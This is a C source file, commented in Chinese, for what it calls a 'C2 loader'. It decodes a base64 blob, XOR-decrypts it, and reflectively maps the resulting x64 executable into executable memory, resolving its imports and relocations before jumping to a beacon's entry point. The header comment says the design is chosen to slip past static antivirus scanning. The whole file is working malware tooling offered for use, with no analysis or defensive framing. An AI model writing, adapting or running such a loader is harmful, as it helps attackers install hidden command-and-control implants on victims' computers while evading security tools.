/* Camty C2 loader（C，x64）：读取 XOR 加密的 PE blob → 内存解密 → 手动节映射 →
 * 基址重定位 → 调 entrypoint。无 csc/Add-Type 托管编译特征，适合过静态查杀。
 *
 * 用法：loader.exe <blob.b64> [key]
 * blob 由 scripts/pack_xor.py 生成；加载 beacon（无限循环）后进程由 beacon 接管。
 * 构建：zig cc -O2 -o loader.exe loader.c
 */
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* ---------- base64 ---------- */

static int b64_idx(char c)
{
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static uint8_t *b64_decode(const char *src, size_t *out_len)
{
    size_t n = strlen(src);
    uint8_t *out = (uint8_t *)malloc(n / 4 * 3 + 8);
    size_t o = 0;
    int quad[4], qi = 0;
    for (size_t i = 0; i < n; i++) {
        int v = b64_idx(src[i]);
        if (v < 0) continue;  /* 忽略 \r\n 空白 */
        quad[qi++] = v;
        if (qi == 4) {
            out[o++] = (uint8_t)((quad[0] << 2) | (quad[1] >> 4));
            out[o++] = (uint8_t)((quad[1] << 4) | (quad[2] >> 2));
            out[o++] = (uint8_t)((quad[2] << 6) | quad[3]);
            qi = 0;
        }
    }
    if (qi == 3) {
        out[o++] = (uint8_t)((quad[0] << 2) | (quad[1] >> 4));
        out[o++] = (uint8_t)((quad[1] << 4) | (quad[2] >> 2));
    } else if (qi == 2) {
        out[o++] = (uint8_t)((quad[0] << 2) | (quad[1] >> 4));
    }
    *out_len = o;
    return out;
}

/* ---------- 内存加载 ---------- */

typedef int (__stdcall *entry_t)(void);

static int load_pe(uint8_t *bytes, size_t len)
{
    if (len < 0x40 || *(uint16_t *)bytes != 0x5A4D) return -1;
    DWORD dos = *(uint32_t *)(bytes + 0x3C);
    if (dos + 24 + 224 > len) return -1;
    WORD machine = *(uint16_t *)(bytes + dos + 4);
    if (machine != 0x8664) {
        fprintf(stderr, "loader: 仅支持 x64 PE（machine=0x%04X）\n", machine);
        return -1;
    }
    uint8_t *opt = bytes + dos + 4 + 20;          /* OptionalHeader64 起点 */
    DWORD entry_rva = *(uint32_t *)(opt + 16);
    ULONGLONG image_base = *(uint64_t *)(opt + 24);
    DWORD size_of_image = *(uint32_t *)(opt + 56);
    DWORD hdr_size = *(uint32_t *)(opt + 60);
    WORD num_sections = *(uint16_t *)(bytes + dos + 4 + 2);
    WORD size_of_opt = *(uint16_t *)(bytes + dos + 4 + 16);
    uint8_t *first_section = opt + size_of_opt;

    LPVOID base = VirtualAlloc(NULL, size_of_image,
                               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) return -1;
    memcpy(base, bytes, hdr_size);

    for (WORD s = 0; s < num_sections; s++) {
        uint8_t *sh = first_section + 40 * s;
        DWORD rsize = *(uint32_t *)(sh + 16);
        DWORD raddr = *(uint32_t *)(sh + 20);
        DWORD vaddr = *(uint32_t *)(sh + 12);
        if (rsize == 0) continue;
        memcpy((uint8_t *)base + vaddr, bytes + raddr, rsize);
    }

    /* 导入表（IAT）解析：不解析则任何 API 调用直接崩 */
    DWORD imp_rva = *(uint32_t *)(opt + 120);   /* DataDirectory[1] */
    if (imp_rva) {
        IMAGE_IMPORT_DESCRIPTOR *desc =
            (IMAGE_IMPORT_DESCRIPTOR *)((uint8_t *)base + imp_rva);
        for (; desc->Name; desc++) {
            const char *dll = (const char *)base + desc->Name;
            HMODULE h = GetModuleHandleA(dll);
            if (!h) h = LoadLibraryA(dll);
            if (!h) continue;
            uint64_t *thunk = (uint64_t *)((uint8_t *)base +
                (desc->OriginalFirstThunk ? desc->OriginalFirstThunk : desc->FirstThunk));
            uint64_t *iat = (uint64_t *)((uint8_t *)base + desc->FirstThunk);
            for (; *thunk; thunk++, iat++) {
                if (*thunk & (1ULL << 63)) {  /* 序号导入 */
                    *iat = (uint64_t)GetProcAddress(h, (LPCSTR)(uintptr_t)(*thunk & 0xFFFF));
                } else {
                    IMAGE_IMPORT_BY_NAME *byname =
                        (IMAGE_IMPORT_BY_NAME *)((uint8_t *)base + (DWORD)*thunk);
                    *iat = (uint64_t)GetProcAddress(h, byname->Name);
                }
            }
        }
    }

    /* 基址重定位（DataDirectory[5]） */
    LONG64 delta = (LONG64)((uint64_t)base - image_base);
    if (delta != 0) {
        DWORD reloc_rva = *(uint32_t *)(opt + 152);
        DWORD reloc_size = *(uint32_t *)(opt + 156);
        uint8_t *p = (uint8_t *)base + reloc_rva;
        uint8_t *end = p + reloc_size;
        while (p < end) {
            DWORD page_rva = *(uint32_t *)p;
            DWORD block_size = *(uint32_t *)(p + 4);
            if (block_size < 8) break;
            for (DWORD o = 8; o < block_size; o += 2) {
                WORD entry = *(uint16_t *)(p + o);
                WORD type = entry >> 12;
                WORD off = entry & 0xFFF;
                if (type == 10) {  /* IMAGE_REL_BASED_DIR64 */
                    uint64_t *t = (uint64_t *)((uint8_t *)base + page_rva + off);
                    *t = (uint64_t)((LONG64)*t + delta);
                }
            }
            p += block_size;
        }
    }

    entry_t entry = (entry_t)((uint8_t *)base + entry_rva);
    entry();  /* beacon 的 main：无限循环，不返回 */
    return 0;
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "用法: loader.exe <blob.b64> [key]\n");
        return 1;
    }
    FILE *f = fopen(argv[1], "rb");
    if (!f) { perror("loader: 打开 blob"); return 1; }
    fseek(f, 0, SEEK_END);
    long n = ftell(f);
    fseek(f, 0, SEEK_SET);
    char *text = (char *)malloc(n + 1);
    size_t got = fread(text, 1, n, f);
    fclose(f);
    text[got] = 0;

    size_t len = 0;
    uint8_t *bytes = b64_decode(text, &len);
    free(text);

    const char *key = argc > 2 ? argv[2] : "camty";
    size_t klen = strlen(key);
    for (size_t i = 0; i < len; i++) bytes[i] ^= (uint8_t)key[i % klen];

    int rc = load_pe(bytes, len);
    free(bytes);
    if (rc != 0) { fprintf(stderr, "loader: 加载失败\n"); return 1; }
    return 0;
}
